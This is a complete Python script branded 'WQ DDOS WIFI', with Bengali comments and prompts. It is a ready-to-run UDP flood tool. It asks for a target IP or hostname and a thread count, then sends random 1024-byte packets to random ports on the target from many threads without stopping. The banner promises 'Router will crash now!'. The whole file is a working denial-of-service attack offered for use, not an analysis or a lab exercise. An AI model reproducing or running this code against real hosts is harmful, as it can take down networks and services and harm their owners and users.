#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import threading
import time
import sys
import os

# টার্মক্স কালার কোড
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'e': '\033[0m',
    'bold': '\033[1m'
}

def _clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def _print_banner():
    banner = f"""
{_c['c']}{_c['bold']}╔══════════════════════════════════════════════════════╗{_c['e']}
{_c['c']}{_c['bold']}║{_c['e']}               {_c['r']}{_c['bold']}W Q   D D O S   W I F I{_c['e']}                {_c['c']}{_c['bold']}║{_c['e']}
{_c['c']}{_c['bold']}╚══════════════════════════════════════════════════════╝{_c['e']}
{_c['y']}Author   : {_c['w']}@wqtarik{_c['e']}
{_c['y']}Telegram : {_c['w']}https://t.me/WQchanneloft{_c['e']}
{_c['y']}Status   : {_c['w']}Hyper-Threaded Edition{_c['e']}

{_c['g']}Press CTRL+C to stop attacking{_c['e']}
----------------------------------------
"""
    print(banner)

# গ্লোবাল কাউন্টার
sent_packets = 0
lock = threading.Lock()

def attack_worker(target_ip, packet_data):
    global sent_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            target_port = random.randint(1, 65535)
            sock.sendto(packet_data, (target_ip, target_port))

            with lock:
                sent_packets += 1
                current_sent = sent_packets
                current_port = target_port

            # স্পিড ঠিক রাখার জন্য প্রতি ১০০ প্যাকেটে একবার প্রিন্ট হবে
            if current_sent % 100 == 0:
                sys.stdout.write(f"\r{_c['g']}Sent {current_sent} packets to {target_ip} throught port:{current_port}{_c['e']}   ")
                sys.stdout.flush()
        except:
            pass

def main():
    _clear()
    _print_banner()

    target_ip = input(f"{_c['w']}[*] {_c['r']}IP or HOSTNAME :{_c['g']} ").strip()

    if not target_ip:
        print(f"{_c['r']}[!] সঠিক IP বা Hostname দিন, ওস্তাদ!{_c['e']}")
        return

    try:
        threads_count = int(input(f"{_c['w']}[*] {_c['y']}Enter Threads (Recommended 50-100): {_c['g']}") or 50)
    except ValueError:
        threads_count = 50

    print(f"\n{_c['g']}[*] Target Locked: {target_ip}{_c['e']}")
    print(f"{_c['y']}[*] Launching {threads_count} Hyper-Threads... Router will crash now!{_c['e']}\n")
    time.sleep(1)

    packet_data = random._urandom(1024)

    # মাল্টি-থ্রেডিং স্টার্ট করা হচ্ছে
    for _ in range(threads_count):
        t = threading.Thread(target=attack_worker, args=(target_ip, packet_data))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{_c['r']}[!] Attack stopped by user, Oustad!{_c['e']}")
        print(f"{_c['c']}[*] Total Packets Sent: {sent_packets}{_c['e']}")
        sys.exit(0)

if __name__ == "__main__":
    main()
